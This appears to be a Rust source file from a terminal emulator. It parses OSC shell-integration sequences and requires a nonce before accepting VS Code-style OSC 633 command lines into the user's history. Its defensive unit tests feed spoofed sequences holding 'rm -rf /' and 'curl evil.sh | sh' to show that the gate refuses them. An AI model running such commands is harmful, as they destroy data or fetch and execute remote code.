//! Lightweight OSC sniffer for sequences `alacritty_terminal` does not surface
//! as events: OSC 7 (working directory), OSC 133 (shell-integration / semantic
//! prompt marks), OSC 633 (VS Code's shell-integration superset, whose `E`
//! carries the command line itself), and OSC 9 (notifications + progress).
//!
//! It scans the same byte stream fed to the emulator and extracts only those
//! sequences; everything else passes through untouched. alacritty still parses
//! the full stream and harmlessly ignores the OSC numbers it does not know, so
//! this only ever *reads* the bytes, it never strips or rewrites them. The
//! scanner is resumable: an OSC split across two `feed` calls is reassembled.

/// Process-wide nonce every `OSC 633 ; E` must echo back, installed once at
/// boot from the vault setting the app shows in Settings > Terminal.
///
/// Global rather than per-sniffer because the alternative is remembering to
/// call [`OscSniffer::set_command_nonce`] at 26 different terminal-creation
/// sites, and the one that gets forgotten is the pane where spoofing works.
/// The value is leaked on purpose: it is set once per process (twice if the
/// user regenerates the key), and `&'static str` is what lets the hot path
/// compare without cloning a `String` per sequence.
static GLOBAL_NONCE: std::sync::RwLock<Option<&'static str>> = std::sync::RwLock::new(None);

/// Install the nonce every pane in this process will demand. `None` disarms
/// the in-band path entirely (no `E` is accepted), which is the safe default
/// a process that never calls this keeps.
pub fn set_global_command_nonce(nonce: Option<String>) {
    let leaked = nonce.map(|n| &*Box::leak(n.into_boxed_str()));
    if let Ok(mut slot) = GLOBAL_NONCE.write() {
        *slot = leaked;
    }
}

/// The installed nonce, or `None` when the app never installed one.
fn global_nonce() -> Option<&'static str> {
    GLOBAL_NONCE.read().ok().and_then(|slot| *slot)
}

/// A shell-integration mark (OSC 133, the FinalTerm semantic-prompt protocol).
/// Consumed by the command-history capture: `PromptEnd` tells the app the
/// shell is reading a command line (and at which column it starts), and
/// `OutputStart` / `CommandEnd` tell it any further input is a running
/// program's stdin (passwords, editor keystrokes) and must not be recorded.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ShellMark {
    /// `OSC 133 ; A` prompt start.
    PromptStart,
    /// `OSC 133 ; B` prompt end (the command line begins).
    PromptEnd,
    /// `OSC 133 ; C` command output begins.
    OutputStart,
    /// `OSC 133 ; D` command finished, with the exit code when the shell
    /// reports one (`D;<code>`).
    CommandEnd(Option<i32>),
    /// `OSC 633 ; E` the shell reported the command line it parsed, carried
    /// by id into the sniffer's text arena (drained by
    /// [`OscSniffer::take_command_lines`]). An id rather than the `String`
    /// itself so this enum stays `Copy` for the mark plumbing, and so a
    /// text dropped by the arena cap can never resolve to a *different*
    /// command than the mark meant.
    CommandLine(u32),
}

/// A [`ShellMark`] paired with the byte offset (into the `feed` slice) just
/// past its terminator. The backend uses the offset to advance the emulator
/// in segments and snapshot the cursor exactly where the mark was emitted,
/// which is what makes the recorded prompt column trustworthy even when the
/// same batch carries more output after the mark (right-side prompts,
/// command echo, ...).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct MarkEvent {
    pub offset: usize,
    pub mark: ShellMark,
}

/// A [`ShellMark`] stamped with the grid position the cursor held when the
/// mark was processed: `abs_line` is `history_size + visible line` (an
/// absolute row index that survives scrolling until the scrollback ring
/// saturates) and `col` is the cursor column. For `PromptEnd` that column is
/// where the user's command text begins.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct PositionedShellMark {
    pub mark: ShellMark,
    pub abs_line: i64,
    pub col: u16,
}

/// OSC 9;4 progress report (ConEmu / Windows Terminal). `state`: 0 = clear,
/// 1 = normal, 2 = error, 3 = indeterminate, 4 = warning. `value`: 0..=100.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub struct Progress {
    pub state: u8,
    pub value: u8,
}

#[derive(Default)]
enum Scan {
    #[default]
    Normal,
    /// Saw `ESC`.
    Esc,
    /// Inside an OSC, accumulating the payload.
    Osc,
    /// Inside an OSC and saw `ESC` (a possible `ST` terminator `ESC \`).
    OscEsc,
}

/// Hard cap on a single OSC payload so malformed input can't grow the buffer
/// without bound. Real OSC 7/133/9 payloads are tiny; an OSC 633 command line
/// is bounded by the same value, well past any real command.
const MAX_OSC: usize = 8192;

/// Hard cap on the undrained command-line arena. The host drains it once per
/// output batch, so it normally holds zero or one entry; the cap only bounds
/// the pathological case of a stream nobody consumes.
const MAX_COMMAND_LINES: usize = 64;

#[derive(Default)]
pub struct OscSniffer {
    scan: Scan,
    buf: Vec<u8>,
    cwd: Option<String>,
    notification: Option<String>,
    progress: Option<Progress>,
    /// Command lines reported by `OSC 633 ; E`, each with the id its
    /// [`ShellMark::CommandLine`] carries.
    command_lines: Vec<(u32, String)>,
    /// Monotonic id generator for the arena. Wrapping is harmless: the arena
    /// never holds more than [`MAX_COMMAND_LINES`] entries at a time.
    command_seq: u32,
    /// Per-sniffer override of [`GLOBAL_NONCE`], for tests and for a future
    /// per-host key. `None` (the normal case) falls back to the global one,
    /// and when neither is set no `E` is accepted at all: see the reasoning
    /// in `parse_osc633`.
    nonce: Option<String>,
    /// Whether a refused `E` was already logged on this sniffer. A refusal
    /// is silent by design (the sequence is invisible to the user either
    /// way), but silence has one bad case: a host still sourcing the old
    /// two-field snippet simply stops reporting, and "my history stopped"
    /// then has nothing to look at. One debug line per pane answers it
    /// without letting a hostile stream flood the log.
    nonce_refusal_logged: bool,
}

impl OscSniffer {
    /// Feed a chunk of PTY bytes. Extracts any complete OSC 7/9 sequences
    /// into the pending fields, drained by the `take_*` accessors, and
    /// returns the OSC 133 shell-integration marks found in this chunk with
    /// the byte offset just past each terminator (empty for the common
    /// no-mark chunk). A mark split across two `feed` calls completes in the
    /// later call and reports its offset within that call's slice.
    pub fn feed(&mut self, bytes: &[u8]) -> Vec<MarkEvent> {
        let mut marks: Vec<MarkEvent> = Vec::new();
        for (i, &b) in bytes.iter().enumerate() {
            match self.scan {
                Scan::Normal => {
                    if b == 0x1b {
                        self.scan = Scan::Esc;
                    }
                }
                Scan::Esc => match b {
                    b']' => {
                        self.scan = Scan::Osc;
                        self.buf.clear();
                    }
                    0x1b => {} // back-to-back ESC, stay armed
                    _ => self.scan = Scan::Normal,
                },
                Scan::Osc => match b {
                    0x07 => {
                        // BEL terminator
                        if let Some(mark) = self.finish() {
                            marks.push(MarkEvent { offset: i + 1, mark });
                        }
                        self.scan = Scan::Normal;
                    }
                    0x1b => self.scan = Scan::OscEsc,
                    _ => {
                        if self.buf.len() < MAX_OSC {
                            self.buf.push(b);
                        } else {
                            // Overflow: abandon this sequence.
                            self.buf.clear();
                            self.scan = Scan::Normal;
                        }
                    }
                },
                Scan::OscEsc => match b {
                    b'\\' => {
                        // ST terminator (ESC \)
                        if let Some(mark) = self.finish() {
                            marks.push(MarkEvent { offset: i + 1, mark });
                        }
                        self.scan = Scan::Normal;
                    }
                    0x1b => {} // another ESC, keep waiting for the backslash
                    _ => {
                        // ESC then non-backslash: not a terminator, the OSC is
                        // aborted by a new escape. Drop it.
                        self.buf.clear();
                        self.scan = Scan::Normal;
                    }
                },
            }
        }
        marks
    }

    /// Parse a completed OSC payload (`buf`) and route it. OSC 133 marks are
    /// returned to `feed` (which stamps their byte offset); the rest land in
    /// the pending fields.
    fn finish(&mut self) -> Option<ShellMark> {
        let content = std::mem::take(&mut self.buf);
        let Ok(s) = std::str::from_utf8(&content) else {
            return None;
        };
        let (num, rest) = s.split_once(';').unwrap_or((s, ""));
        match num {
            "7" => {
                if let Some(path) = parse_osc7(rest) {
                    self.cwd = Some(path);
                }
            }
            "133" => return parse_osc133(rest),
            "633" => return self.parse_osc633(rest),
            "9" => {
                if let Some(p) = rest.strip_prefix("4;") {
                    if let Some(progress) = parse_progress(p) {
                        self.progress = Some(progress);
                    }
                } else if !rest.is_empty() {
                    self.notification = Some(rest.to_string());
                }
            }
            _ => {}
        }
        None
    }

    /// Parse an OSC 633 payload, VS Code's shell-integration superset of OSC
    /// 133. `A`/`B`/`C`/`D` mean exactly what their 133 twins mean, so they
    /// map onto the same marks (a host may emit either family). `E` is the
    /// one sequence no other protocol has: the command line as the SHELL
    /// parsed it, which is the only trustworthy source of the command text
    /// under a multiplexer, where the grid the app sees is tmux's repaint of
    /// every pane rather than the shell's own line.
    fn parse_osc633(&mut self, rest: &str) -> Option<ShellMark> {
        // Every argument escapes `;` as `\x3b`, so splitting on `;` is safe.
        let mut parts = rest.splitn(3, ';');
        match parts.next()? {
            "A" => Some(ShellMark::PromptStart),
            "B" => Some(ShellMark::PromptEnd),
            "C" => Some(ShellMark::OutputStart),
            "D" => Some(ShellMark::CommandEnd(
                parts.next().and_then(|c| c.parse::<i32>().ok()),
            )),
            "E" => {
                let raw = parts.next()?;
                // The nonce is MANDATORY, and its absence refuses rather than
                // waves through. `E` is the one mark that carries text into
                // the user's command history, where a row is one click from
                // running again, so anything that reaches a terminal can
                // otherwise put words in the user's mouth: a `cat` of a
                // crafted file, a log line, an HTTP response, a compromised
                // host. Requiring a secret the shell echoes back is the only
                // way to tell "the shell reported what it parsed" apart from
                // "something printed bytes", and failing CLOSED is what keeps
                // a forgotten `set_command_nonce` from silently reopening it.
                let expected = self.nonce.as_deref().or(global_nonce());
                if expected.is_none() || parts.next() != expected {
                    if !self.nonce_refusal_logged {
                        self.nonce_refusal_logged = true;
                        tracing::debug!(
                            "osc 633;E refused: the reported command line does not \
                             carry this vault's shell-integration key (copy the \
                             current snippet from Settings > Terminal)"
                        );
                    }
                    return None;
                }
                let text = decode_osc633_arg(raw);
                if text.is_empty() {
                    return None;
                }
                if self.command_lines.len() >= MAX_COMMAND_LINES {
                    self.command_lines.remove(0);
                }
                let id = self.command_seq;
                self.command_seq = self.command_seq.wrapping_add(1);
                self.command_lines.push((id, text));
                Some(ShellMark::CommandLine(id))
            }
            // `P;Key=Value` properties. `Cwd` is the OSC 7 equivalent, so it
            // feeds the same field; the rest is VS Code bookkeeping.
            "P" => {
                if let Some(path) = parts.next().and_then(|p| p.strip_prefix("Cwd="))
                    && path.starts_with('/')
                {
                    self.cwd = Some(path.to_string());
                }
                None
            }
            _ => None,
        }
    }

    /// Override the process-wide nonce for this sniffer alone. `None`
    /// restores the fallback to [`set_global_command_nonce`]; it does NOT
    /// mean "accept anything".
    pub fn set_command_nonce(&mut self, nonce: Option<String>) {
        self.nonce = nonce;
    }

    /// Drain the command lines reported since the last call, each paired
    /// with the id its [`ShellMark::CommandLine`] carries. Drain this
    /// together with the marks: a mark whose text was already drained (or
    /// dropped by the arena cap) resolves to nothing, never to another
    /// command.
    /// The command line an `E` mark of this batch carries, before the
    /// batch's lines are drained.
    pub(crate) fn command_line(&self, id: u32) -> Option<&str> {
        self.command_lines.iter().find(|(i, _)| *i == id).map(|(_, t)| t.as_str())
    }

    pub fn take_command_lines(&mut self) -> Vec<(u32, String)> {
        std::mem::take(&mut self.command_lines)
    }

    pub fn take_cwd(&mut self) -> Option<String> {
        self.cwd.take()
    }

    pub fn take_notification(&mut self) -> Option<String> {
        self.notification.take()
    }

    pub fn progress(&self) -> Option<Progress> {
        self.progress
    }
}

/// Parse an OSC 7 payload (`file://host/path`, percent-encoded) into a local
/// filesystem path. A bare `/path` (some shells omit the `file://` host) is
/// accepted too. Returns `None` for anything that isn't an absolute path.
fn parse_osc7(rest: &str) -> Option<String> {
    let after_scheme = rest.strip_prefix("file://").unwrap_or(rest);
    // Drop the authority (host) component: the path starts at the first '/'.
    let path = match after_scheme.find('/') {
        Some(i) => &after_scheme[i..],
        None if after_scheme.starts_with('/') => after_scheme,
        None => return None,
    };
    if !path.starts_with('/') {
        return None;
    }
    Some(percent_decode(path))
}

/// Minimal percent-decoder for OSC 7 paths (spaces arrive as `%20`, etc.).
/// Invalid escapes are kept literally.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hi = (bytes[i + 1] as char).to_digit(16);
            let lo = (bytes[i + 2] as char).to_digit(16);
            if let (Some(h), Some(l)) = (hi, lo) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Parse an OSC 133 payload (`A`, `B`, `C`, `D`, or `D;<code>`).
fn parse_osc133(rest: &str) -> Option<ShellMark> {
    let kind = rest.as_bytes().first()?;
    match kind {
        b'A' => Some(ShellMark::PromptStart),
        b'B' => Some(ShellMark::PromptEnd),
        b'C' => Some(ShellMark::OutputStart),
        b'D' => {
            // `D` or `D;<exit code>` (further `;k=v` params ignored).
            let code = rest
                .split_once(';')
                .and_then(|(_, tail)| tail.split(';').next())
                .and_then(|c| c.parse::<i32>().ok());
            Some(ShellMark::CommandEnd(code))
        }
        _ => None,
    }
}

/// Decode an OSC 633 argument. The sender escapes `\` as `\\` and every
/// character at 0x20 or below (plus `;`, which would otherwise split the
/// payload) as `\xAB`, so a command line survives newlines and semicolons
/// intact. An incomplete or malformed escape is kept literally rather than
/// dropped: a mangled command must still read like the text it came from.
fn decode_osc633_arg(raw: &str) -> String {
    let b = raw.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'\\' && i + 1 < b.len() {
            if b[i + 1] == b'\\' {
                out.push(b'\\');
                i += 2;
                continue;
            }
            if (b[i + 1] | 0x20) == b'x' && i + 3 < b.len() {
                let hi = (b[i + 2] as char).to_digit(16);
                let lo = (b[i + 3] as char).to_digit(16);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h * 16 + l) as u8);
                    i += 4;
                    continue;
                }
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Parse an OSC 9;4 progress body (`<state>;<value>`).
fn parse_progress(p: &str) -> Option<Progress> {
    let (st, val) = p.split_once(';').unwrap_or((p, "0"));
    let state: u8 = st.trim().parse().ok()?;
    let value: u8 = val.trim().parse().unwrap_or(0).min(100);
    Some(Progress { state, value })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sniff(input: &[u8]) -> OscSniffer {
        let mut s = OscSniffer::default();
        let _ = s.feed(input);
        s
    }

    #[test]
    fn osc7_cwd_bel_and_st_terminators() {
        // BEL-terminated, file:// with host.
        let mut s = sniff(b"\x1b]7;file://host/home/wilson\x07");
        assert_eq!(s.take_cwd().as_deref(), Some("/home/wilson"));
        // ST-terminated (ESC \), empty host, percent-encoded space.
        let mut s = sniff(b"\x1b]7;file:///home/my%20dir\x1b\\");
        assert_eq!(s.take_cwd().as_deref(), Some("/home/my dir"));
    }

    /// The exact payloads the documented shell snippet emits
    /// (`docs/CWD.md`). That snippet is the only supported way to get
    /// exact cwd following now that the app no longer types a setup
    /// line into the shell, so what it encodes and what this parser
    /// decodes have to be pinned together: it percent-encodes the path
    /// BYTE by byte under `LC_ALL=C`, which is the half a hand-rolled
    /// encoder gets wrong (a multi-byte character encoded per CHARACTER
    /// decodes back to mojibake, and a raw space ends the URL early).
    #[test]
    fn osc7_decodes_what_the_documented_snippet_encodes() {
        for (wire, want) in [
            ("/tmp/dir%20with%20space", "/tmp/dir with space"),
            ("/tmp/hash%23and%25pct", "/tmp/hash#and%pct"),
            ("/tmp/acentua%C3%A7%C3%A3o", "/tmp/acentuação"),
            // Unreserved by the snippet's safe set, so they travel raw.
            ("/tmp/plain-._~!'()", "/tmp/plain-._~!'()"),
        ] {
            let mut s = sniff(format!("\x1b]7;file://host{wire}\x07").as_bytes());
            assert_eq!(s.take_cwd().as_deref(), Some(want), "wire: {wire}");
        }
    }

    #[test]
    fn osc_split_across_feeds_is_reassembled() {
        let mut s = OscSniffer::default();
        let _ = s.feed(b"\x1b]7;file://h/ho");
        let _ = s.feed(b"me/w\x07");
        assert_eq!(s.take_cwd().as_deref(), Some("/home/w"));
    }

    #[test]
    fn osc133_marks_with_offsets() {
        let mut s = OscSniffer::default();
        let input: &[u8] = b"\x1b]133;A\x07\x1b]133;B\x07\x1b]133;C\x07\x1b]133;D;7\x07";
        let events = s.feed(input);
        assert_eq!(
            events.iter().map(|e| e.mark).collect::<Vec<_>>(),
            vec![
                ShellMark::PromptStart,
                ShellMark::PromptEnd,
                ShellMark::OutputStart,
                ShellMark::CommandEnd(Some(7)),
            ]
        );
        // Offsets point just past each BEL terminator, so slicing the input
        // at them replays the stream in mark-aligned segments.
        assert_eq!(
            events.iter().map(|e| e.offset).collect::<Vec<_>>(),
            vec![8, 16, 24, 34]
        );
        assert_eq!(input.len(), 34);
    }

    #[test]
    fn osc133_mark_split_across_feeds_reports_offset_in_second_slice() {
        let mut s = OscSniffer::default();
        assert!(s.feed(b"prompt\x1b]133;").is_empty());
        let events = s.feed(b"B\x07tail");
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].mark, ShellMark::PromptEnd);
        assert_eq!(events[0].offset, 2); // just past the BEL in this slice
    }

    #[test]
    fn osc633_reports_command_line_and_maps_prompt_marks() {
        let mut s = OscSniffer::default();
        s.set_command_nonce(Some("s3cret".to_string()));
        // The A/B/E/C/D cycle the snippet emits, with a command line carrying
        // an escaped semicolon and newline, and the nonce as the last field.
        let events = s.feed(
            b"\x1b]633;A\x07\x1b]633;B\x07\x1b]633;E;echo a\\x3b echo b;s3cret\x07\x1b]633;C\x07\x1b]633;D;0\x07",
        );
        assert_eq!(
            events.iter().map(|e| e.mark).collect::<Vec<_>>(),
            vec![
                ShellMark::PromptStart,
                ShellMark::PromptEnd,
                ShellMark::CommandLine(0),
                ShellMark::OutputStart,
                ShellMark::CommandEnd(Some(0)),
            ]
        );
        assert_eq!(
            s.take_command_lines(),
            vec![(0, "echo a; echo b".to_string())]
        );
        // Drained: a second call can't hand the same text to another mark.
        assert!(s.take_command_lines().is_empty());
    }

    #[test]
    fn osc633_escapes_decode_and_malformed_ones_stay_literal() {
        assert_eq!(decode_osc633_arg(r"echo a\x3b b"), "echo a; b");
        assert_eq!(decode_osc633_arg(r"printf 'a\x0ab'"), "printf 'a\nb'");
        assert_eq!(decode_osc633_arg(r"grep '\\' file"), r"grep '\' file");
        // Truncated / non-hex escapes are not silently swallowed.
        assert_eq!(decode_osc633_arg(r"tail\x"), r"tail\x");
        assert_eq!(decode_osc633_arg(r"tail\xZZ"), r"tail\xZZ");
        assert_eq!(decode_osc633_arg("plain"), "plain");
    }

    #[test]
    fn osc633_nonce_gate_rejects_spoofed_command_lines() {
        let mut s = OscSniffer::default();
        s.set_command_nonce(Some("s3cret".to_string()));
        // No nonce, and a wrong one: both are a hostile file printing the
        // sequence, never our snippet.
        let events = s.feed(b"\x1b]633;E;rm -rf /\x07\x1b]633;E;rm -rf /;wrong\x07");
        assert!(events.is_empty());
        assert!(s.take_command_lines().is_empty());
        // The real snippet's sequence still lands.
        let events = s.feed(b"\x1b]633;E;ls -la;s3cret\x07");
        assert_eq!(events.len(), 1);
        assert_eq!(s.take_command_lines(), vec![(0, "ls -la".to_string())]);
    }

    /// The gate FAILS CLOSED: a sniffer with no nonce of its own, in a
    /// process where none was installed, accepts nothing. This is the arm
    /// that matters, because it is the state every forgotten wiring lands
    /// in, and the old code waved those `E`s straight into the user's
    /// command history.
    #[test]
    fn osc633_without_any_nonce_accepts_nothing() {
        // No `set_global_command_nonce` in this crate's tests, so the global
        // slot is empty; asserted rather than assumed, since a leaked value
        // from another test would make this pass for the wrong reason.
        assert!(global_nonce().is_none());
        let mut s = OscSniffer::default();
        let events = s.feed(b"\x1b]633;E;curl evil.sh | sh\x07\x1b]633;E;ls;anything\x07");
        assert!(events.is_empty());
        assert!(s.take_command_lines().is_empty());
        // The rest of the protocol is unaffected: prompt marks carry no text
        // and cannot be used to put words in the user's history.
        let events = s.feed(b"\x1b]633;A\x07\x1b]633;C\x07");
        assert_eq!(
            events.iter().map(|e| e.mark).collect::<Vec<_>>(),
            vec![ShellMark::PromptStart, ShellMark::OutputStart]
        );
    }

    #[test]
    fn osc633_property_reports_cwd_and_empty_command_is_ignored() {
        let mut s = sniff(b"\x1b]633;P;Cwd=/srv/app\x07");
        assert_eq!(s.take_cwd().as_deref(), Some("/srv/app"));
        // A bare Enter at the prompt reports an empty command line, which is
        // not a command and must not reach the arena. Nonce supplied, so the
        // rejection under test is the emptiness and not the gate.
        let mut s = OscSniffer::default();
        s.set_command_nonce(Some("s3cret".to_string()));
        assert!(s.feed(b"\x1b]633;E;;s3cret\x07").is_empty());
        assert!(s.take_command_lines().is_empty());
    }

    #[test]
    fn osc9_notification_and_progress() {
        let mut s = sniff(b"\x1b]9;build done\x07");
        assert_eq!(s.take_notification().as_deref(), Some("build done"));
        let s = sniff(b"\x1b]9;4;1;42\x07");
        assert_eq!(s.progress(), Some(Progress { state: 1, value: 42 }));
        // Clamp out-of-range progress.
        let s = sniff(b"\x1b]9;4;1;250\x07");
        assert_eq!(s.progress(), Some(Progress { state: 1, value: 100 }));
    }

    #[test]
    fn unrelated_osc_and_text_ignored() {
        // OSC 0 (title, alacritty's job) and plain text leave no signals.
        let mut s = OscSniffer::default();
        let events = s.feed(b"hello \x1b]0;a title\x07 world");
        assert!(events.is_empty());
        assert!(s.take_cwd().is_none());
        assert!(s.take_notification().is_none());
        assert!(s.progress().is_none());
    }
}
